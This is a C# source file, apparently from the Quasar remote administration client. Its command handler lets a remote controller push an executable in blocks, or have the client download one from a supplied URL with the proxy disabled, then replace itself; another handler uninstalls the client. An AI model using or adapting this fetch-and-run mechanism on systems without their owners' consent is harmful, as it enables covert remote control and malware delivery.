using Quasar.Client.Installation;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using System;
using System.Net;
using System.Threading;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleDoClientUpdate(DoClientUpdate command, Networking.Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            if (string.IsNullOrEmpty(command.DownloadUrl))
            {
                if (!RenamedFiles.ContainsKey(command.Id))
                    RenamedFiles.Add(command.Id, FileHelper.GetTempFilePath(".exe"));

                string filePath = RenamedFiles[command.Id];

                try
                {
                    if (command.CurrentBlock == 0 && !FileHelper.HasExecutableIdentifier(command.Block))
                        throw new Exception("No executable file");

                    var destFile = new FileSplitLegacy(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                        throw new Exception(destFile.LastError);

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                    {
                        if (RenamedFiles.ContainsKey(command.Id))
                            RenamedFiles.Remove(command.Id);
                        client.Send(new SetStatus {Message = "Updating..."});
                        ClientUpdater.Update(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    if (RenamedFiles.ContainsKey(command.Id))
                        RenamedFiles.Remove(command.Id);
                    NativeMethods.DeleteFile(filePath);
                    client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
                }

                return;
            }

            new Thread(() =>
            {
                client.Send(new SetStatus { Message = "Downloading file..." });

                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadUrl, tempFile);
                    }
                }
                catch
                {
                    client.Send(new SetStatus {Message = "Download failed!"});
                    return;
                }

                client.Send(new SetStatus {Message = "Replacing executable..."});

                ClientUpdater.Update(client, tempFile);
            }).Start();
        }

        public static void HandleDoClientUninstall(DoClientUninstall command, Networking.Client client)
        {
            client.Send(new SetStatus {Message = "Uninstalling... good bye :-("});

            ClientUninstaller.Uninstall(client);
        }
    }
}